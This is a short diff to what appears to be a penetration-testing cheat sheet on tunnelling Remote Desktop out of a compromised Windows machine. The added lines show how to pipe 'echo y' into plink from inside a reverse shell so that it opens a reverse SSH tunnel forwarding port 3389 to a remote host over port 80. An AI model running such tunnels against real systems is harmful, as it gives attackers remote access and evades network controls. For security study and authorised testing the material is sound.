@@ -51,6 +51,10 @@
     *   Port 22 blocked? Try port 80? or 443?
 
         `plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P80`
+        
+    *   This will most likely not work with the interactivity level we have in a typical reverse shell, so we should pipe the answer to the prompt with the `cmd.exe /c echo y` command. 
+
+        `cmd.exe /c echo y | plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P80`
 
 *   Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel (bypass deep packet inspection)
 
